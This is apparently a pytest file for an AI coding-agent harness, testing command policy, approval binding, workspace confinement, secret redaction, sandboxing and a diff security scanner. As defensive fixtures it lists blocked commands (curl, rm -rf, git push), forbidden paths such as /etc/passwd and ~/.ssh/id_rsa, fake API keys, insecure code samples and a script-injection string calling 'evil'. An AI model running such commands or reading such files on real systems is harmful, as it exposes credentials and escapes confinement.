"""Plan policy, approval, workspace confinement, tools, evidence, security scan, k6 rendering. No AI involved."""

import json
import os
import shutil
import sys
import time
from pathlib import Path

import pytest

from evidence_council.agent import journeys as J
from evidence_council.agent import plan as P
from evidence_council.agent.budget import Budget, Limits
from evidence_council.agent.events import Reporter
from evidence_council.agent.evidence import check_expectation, compare, parse_tests, run_command
from evidence_council.agent.messages import ToolCall
from evidence_council.agent.security import scan_diff
from evidence_council.agent.tools import AgentStuck, Toolbox
from evidence_council.agent.agents import SUBMIT_CHANGES
from evidence_council.agent.workspace import ToolError, Workspace
from evidence_council.errors import CouncilError

ROOT = Path(__file__).resolve().parents[1]
SHOP = ROOT / "examples" / "agent-demo" / "tiny-shop"


def base_plan(project, **extra):
    plan = {"schema": "ec-agent-plan/1", "request": "r", "project": {"path": str(project)},
            "items": [{"id": "R1", "phrase": "p", "requirement": "q",
                       "acceptance": {"description": "d", "checks": [{"type": "command", "command_id": "t"}]}}],
            "commands": [{"id": "t", "argv": ["python3", "-c", "print('ok')"], "purpose": "x"}]}
    plan.update(extra)
    return P.normalise(plan)


@pytest.mark.parametrize("argv,needle", [
    (["git", "push", "origin", "main"], "git push"), (["git", "commit", "-m", "x"], "git commit"),
    (["npm", "install"], "npm install"), (["python3", "-m", "pip", "install", "x"], "installing"),
    (["curl", "https://example.com"], "curl"), (["sh", "-c", "make test"], "'sh'"), (["rm", "-rf", "build"], "'rm'"),
    (["python3", "load.py", "--url", "https://api.example.com"], "non-local host"), (["vercel", "deploy"], "vercel"),
    (["python3", "migrate.py", "--database-url=prod"], "production"),
])
def test_policy_blocks_dangerous_commands(argv, needle, tmp_path):
    plan = base_plan(tmp_path)
    plan["commands"][0]["argv"] = argv
    probs = P.lint(plan)
    assert probs and any(needle in p for p in probs), probs


def test_policy_allows_local_test_commands(tmp_path):
    plan = base_plan(tmp_path)
    plan["commands"][0]["argv"] = ["python3", "-m", "pytest", "-q", "--base-url", "http://127.0.0.1:8000"]
    assert P.lint(plan) == []


def test_line_count_is_not_an_optimizer_goal(tmp_path):
    plan = base_plan(tmp_path, optimizer={"goal": "make the code shorter with fewer lines", "metric": {"command_id": "t"}})
    assert any("fewer lines is not accepted" in p for p in P.lint(P.normalise(plan)))


def test_approval_is_bound_to_plan_and_persona_scripts(tmp_path):
    run = tmp_path / "run"
    run.mkdir()
    persona = {"id": "p1", "name": "n", "kind": "http", "steps": [{"action": "request", "method": "GET", "path": "/"}]}
    plan = base_plan(tmp_path, service={"argv": ["python3", "server.py", "--port", "{port}"]}, personas=[persona])
    P.save_plan(run, plan)
    with pytest.raises(CouncilError, match="not been approved"):
        P.require_approval(run, P.load_plan(run))
    P.approve(run, P.load_plan(run), "test")
    P.require_approval(run, P.load_plan(run))
    plan = P.load_plan(run)
    plan["personas"][0]["steps"][0]["path"] = "/admin"          # edit after approval
    P.save_plan(run, plan)
    with pytest.raises(CouncilError, match="changed after it was approved"):
        P.require_approval(run, P.load_plan(run))


def test_cli_confirm_must_match_fingerprint(tmp_path, capsys):
    from evidence_council.cli import main
    run = tmp_path / "run"
    run.mkdir()
    P.save_plan(run, base_plan(tmp_path))
    assert main(["agent", "approve", str(run), "--confirm", "000000000000"]) == 2
    assert "does not match" in capsys.readouterr().err
    fp = P.fingerprint(run, P.load_plan(run))[7:19]
    assert main(["agent", "approve", str(run), "--confirm", fp]) == 0


def test_workspace_copy_skips_secret_files_and_confines_paths(tmp_path):
    proj = tmp_path / "proj"
    shutil.copytree(SHOP, proj)
    (proj / ".env").write_text("API_KEY=sk-abcdefghijklmnopqrstuvwxyz-fake05\n")
    run = tmp_path / "run"
    run.mkdir()
    ws = Workspace.create(proj, run, "copy", "t")
    assert ".env" in ws.skipped_secret_files and not (ws.root / ".env").exists()
    for bad in ["../outside.txt", "/etc/passwd", "~/.ssh/id_rsa", ".git/config", ".env", "keys/server.pem"]:
        with pytest.raises(ToolError):
            ws.resolve(bad)
    ws.snapshot("baseline")
    (ws.root / "shop.py").write_text("broken\n")
    (ws.root / "new.py").write_text("x = 1\n")
    patch, changes = ws.diff("baseline")
    assert {c["path"] for c in changes} == {"shop.py", "new.py"} and "+broken" in patch
    ws.restore("baseline")
    assert ws.diff("baseline")[1] == []
    assert (proj / "shop.py").read_text() == (SHOP / "shop.py").read_text()      # original untouched


def _toolbox(ws, writable=True):
    return Toolbox(ws, "Builder", Reporter(stream=open(os.devnull, "w")), Budget(Limits()), writable, SUBMIT_CHANGES, max_repeat=2)


def test_tools_replace_requires_unique_match_and_readonly_cannot_write(tmp_path):
    shutil.copytree(SHOP, tmp_path / "p")
    ws = Workspace(tmp_path / "p", tmp_path / "p", "copy", tmp_path)
    tb = _toolbox(ws)
    r = tb.execute(ToolCall("1", "replace_in_file", {"path": "shop.py", "old": "    ", "new": "  "}))
    assert r.is_error and "occurs" in r.content
    r = tb.execute(ToolCall("2", "replace_in_file", {"path": "shop.py", "old": "nonexistent text", "new": "x"}))
    assert r.is_error and "not found" in r.content
    ro = Workspace.readonly(tmp_path / "p")
    r = _toolbox(ro, writable=False).execute(ToolCall("3", "write_file", {"path": "x.py", "content": "1"}))
    assert r.is_error


def test_repeated_identical_calls_are_flagged_then_stopped(tmp_path):
    shutil.copytree(SHOP, tmp_path / "p")
    tb = _toolbox(Workspace(tmp_path / "p", tmp_path / "p", "copy", tmp_path))
    call = ToolCall("1", "read_file", {"path": "shop.py"})
    assert not tb.execute(call).is_error
    r2 = tb.execute(call)
    assert r2.is_error and "Repeated call" in r2.content
    tb.execute(call)
    with pytest.raises(AgentStuck):
        tb.execute(call)
    assert len(tb.repeats) >= 2


def test_hung_command_is_killed_and_reported(tmp_path):
    cmd = {"id": "hang", "argv": [sys.executable, "-c", "import time; time.sleep(60)"], "timeout_s": 2, "sandbox": False}
    t0 = time.monotonic()
    r = run_command(cmd, tmp_path, tmp_path / "tmp")
    assert r["status"] == "hung" and time.monotonic() - t0 < 15 and r["exit_code"] is None


def test_commands_get_no_api_keys_and_output_is_redacted(tmp_path, monkeypatch):
    monkeypatch.setenv("GEMINI_API_KEY", "AIzaSyD-abcdefghijklmnopqrstuvwxyz-fake04")
    code = "import os; print('KEY=' + os.environ.get('GEMINI_API_KEY', 'absent')); print('token sk-ant-api03-abcdefghijklmnopqrstuv')"
    r = run_command({"id": "env", "argv": [sys.executable, "-c", code], "sandbox": False}, tmp_path, tmp_path / "tmp")
    assert "KEY=absent" in r["stdout_tail"] and "sk-ant-api03" not in r["stdout_tail"]


@pytest.mark.skipif(sys.platform != "darwin" or not shutil.which("sandbox-exec"), reason="macOS sandbox only")
def test_sandbox_blocks_network_and_writes_outside_workspace(tmp_path):
    code = ("import socket, pathlib\n"
            "try:\n socket.create_connection(('1.1.1.1', 80), timeout=3); print('NET-OK')\nexcept Exception as e: print('NET-BLOCKED')\n"
            "try:\n pathlib.Path('/tmp/ec-sandbox-escape-test').write_text('x'); print('WRITE-OK')\nexcept Exception: print('WRITE-BLOCKED')\n")
    ws = tmp_path / "ws"
    ws.mkdir()
    r = run_command({"id": "sb", "argv": ["python3", "-c", code], "network": "none"}, ws, tmp_path / "tmp")
    assert r["sandboxed"] and "NET-BLOCKED" in r["stdout_tail"] and "WRITE-BLOCKED" in r["stdout_tail"], r


def test_regressions_detected_for_failures_removed_tests_and_fewer_tests():
    base = {"commands": {"t": {"status": "passed", "tests": {"ran": 3, "failed": 0, "names": {"a": "ok", "b": "ok", "c": "ok"}}}}, "journeys": {}}
    cur = {"commands": {"t": {"status": "failed", "tests": {"ran": 2, "failed": 1, "names": {"a": "ok", "b": "FAIL"}}}}, "journeys": {}}
    regs = compare(base, cur)
    assert any("b passed before and now reports FAIL" in r for r in regs)
    assert any("c passed before and no longer runs" in r for r in regs)
    assert any("ran 2 tests, fewer than the 3" in r for r in regs)


def test_parse_unittest_and_expectations():
    out = ("test_a (tests.t.C.test_a) ... ok\ntest_b (tests.t.C.test_b) ... FAIL\n\nRan 2 tests in 0.01s\n")
    t = parse_tests(out)
    assert t == {"ran": 2, "failed": 1, "names": {"tests.t.C.test_a": "ok", "tests.t.C.test_b": "FAIL"}}
    res = {"status": "failed", "exit_code": 1, "stdout_tail": out, "stderr_tail": ""}
    assert check_expectation(res, {"expect_output": r"test_a \(.*\) \.\.\. ok"})[0] == "failed"     # exit code 1
    res["exit_code"] = 0
    assert check_expectation(res, {"expect_output": r"test_a \(.*\) \.\.\. ok"})[0] == "passed"
    assert check_expectation(res, {"expect_output": r"test_c"})[0] == "failed"


def test_security_scan_flags_dangerous_additions_and_test_tampering():
    patch = ("--- a/app.py\n+++ b/app.py\n@@ -1,1 +1,4 @@\n x = 1\n+API_KEY = \"abcd1234efgh5678\"\n"
             "+subprocess.run(cmd, shell=True)\n+cur.execute(f\"SELECT * FROM t WHERE id={uid}\")\n")
    changes = [{"path": "app.py", "status": "modified", "added": 3, "removed": 0},
               {"path": "tests/test_app.py", "status": "modified", "added": 0, "removed": 2},
               {"path": "requirements.txt", "status": "modified", "added": 1, "removed": 0}]
    rules = {f["rule"] for f in scan_diff(patch, changes)}
    assert {"hardcoded-credential", "shell-true", "sql-format", "existing-test-changed", "dependency-change"} <= rules


def test_k6_scripts_embed_step_data_as_json_and_refuse_non_local_targets(tmp_path):
    evil = "'); import('http://evil'); //`${x}`"
    p = {"id": "x", "name": "n", "kind": "browser", "steps": [{"action": "fill", "selector": "#q", "value": evil, "label": "l", "timeout_ms": 1000}]}
    js = J.render_persona(p)
    steps_json = js.split("const STEPS = ", 1)[1].split(";\n", 1)[0]
    assert json.loads(steps_json)[0]["value"] == evil                  # stays data
    assert J.run_k6(tmp_path / "x.js", "https://shop.example.com", tmp_path, 10)["status"] == "error"
    load = J.render_persona({**p, "kind": "http", "steps": [{"action": "request", "method": "GET", "path": "/", "label": "l", "timeout_ms": 100}]},
                            {"id": "l", "vus": 999, "duration_s": 9999})
    assert '"vus": 20' in load and '"duration": "60s"' in load      # light load caps


def test_journey_judge_flags_repeated_work_and_slow_requests():
    persona = {"kind": "browser", "steps": [{"action": "goto"}], "max_requests": 5, "max_request_ms": 1000}
    raw = {"status": "ok", "steps": [{"step": "1", "ok": True}], "requests_per_iteration": 40, "max_request_ms": 9000}
    st, reasons = J.judge_journey(persona, raw)
    assert st == "failed" and any("repeated work" in r for r in reasons) and any("hanging" in r for r in reasons)
